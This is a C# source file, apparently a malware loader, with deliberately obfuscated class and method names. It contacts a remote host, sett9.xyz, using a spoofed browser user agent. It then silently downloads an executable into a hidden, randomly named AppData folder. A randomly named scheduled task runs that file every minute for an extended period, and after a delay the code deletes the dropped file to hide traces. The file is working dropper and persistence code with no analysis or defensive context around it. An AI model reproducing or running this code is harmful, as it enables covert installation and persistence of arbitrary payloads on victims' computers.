﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace QxLoad.XqeUdel
{
    class xzctvdf_c
    {
        public static string filename;
        public static string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static string hDir;
        public static string link = "https://sett9.xyz/LoadQx/PTS";

        public static void reigkr(string link)
        {
            WebRequest request = WebRequest.Create(link);
            request.Credentials = CredentialCache.DefaultCredentials;
            ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0";
            request.GetResponse();
        }

        public static void pmrguwc()
        {
            string rnfjw = "123456789BCDFGHJKLMNPQRSTVWXZbcdfghjkmnpqrstvwxzAEUYaeiouy%$#";
            Random dfw = new Random();
            for (int i = 0; i < 5; i++)
            {
                filename += rnfjw[dfw.Next(0, 61)];
                hDir += rnfjw[dfw.Next(0, 61)];
            }
            WebClient dw = new WebClient();
            dw.DownloadFileCompleted += new AsyncCompletedEventHandler(xqgfryeq.Completed);
            dw.DownloadProgressChanged += new DownloadProgressChangedEventHandler(xqgfryeq.ProgressChanged);
            if (!Directory.Exists(path + "//" + hDir)) ;
            {
                DirectoryInfo di = Directory.CreateDirectory(path + "//" + hDir);
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            }
            dw.DownloadFileAsync(new Uri(link), path + "//" + hDir + "//" + filename + ".exe");
            File.SetAttributes(path + "//" + hDir + "//" + filename + ".exe", FileAttributes.Hidden);
        }

        public static void pforinv()
        {
            var hqrtcv = new Process();
            hqrtcv.StartInfo = new ProcessStartInfo("cmd", "/C " + "schtasks /create /tn \\" + rnditng() + "\\" + rnditng() + " /tr " + path + "//" + hDir + "//" + filename + ".exe" + " /st 00:00 /du 9999:59 /sc once /ri 1 /f");
            hqrtcv.StartInfo.RedirectStandardOutput = true;
            hqrtcv.StartInfo.UseShellExecute = false;
            hqrtcv.StartInfo.CreateNoWindow = true;
            hqrtcv.Start();
            hqrtcv.WaitForExit();
            hqrtcv.Dispose();
            Thread.Sleep(90000);
            File.Delete(path + "//" + hDir + "//" + filename + ".exe");
            Directory.Delete(path + "//" + hDir);
        }

        public static String rnditng()
        {
            string abc = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm";
            string result = "";
            Random rnd = new Random();
            int iter = rnd.Next(0, abc.Length);
            for (int i = 0; i < iter; i++)
                result += abc[rnd.Next(0, abc.Length)];
            return result;
        }
    }
}
